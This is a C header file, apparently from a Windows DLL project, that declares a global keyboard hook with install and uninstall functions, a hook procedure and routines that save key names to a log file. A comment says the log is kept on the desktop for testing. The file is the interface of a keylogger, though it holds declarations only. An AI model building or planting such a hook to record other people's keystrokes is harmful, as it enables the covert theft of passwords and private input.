#pragma once

#include <stdio.h>
#include <shlobj_core.h>
#include <Windows.h>

#ifdef EXPORTS
// 导出函数
#define DLL_API _declspec(dllexport)
#else 
// 导入函数
#define DLL_API _declspec(dllimport)
#endif

HHOOK g_hook;
char LogFilePath[MAX_PATH];

// 安装钩子
BOOL DLL_API InstallHook();

// 卸载钩子
BOOL DLL_API UninstallHook();

// 钩子处理函数
LRESULT CALLBACK keyboardProc(int code, WPARAM wParam, LPARAM lParam);

// 设置文件保存路径(因为用于测试所以保存在桌面)
VOID SetSavePath(); 

// 保存按键信息
BOOL SaveKey(const char* KeyName);

// 错误处理函数
VOID ShowError(const char* FuncName);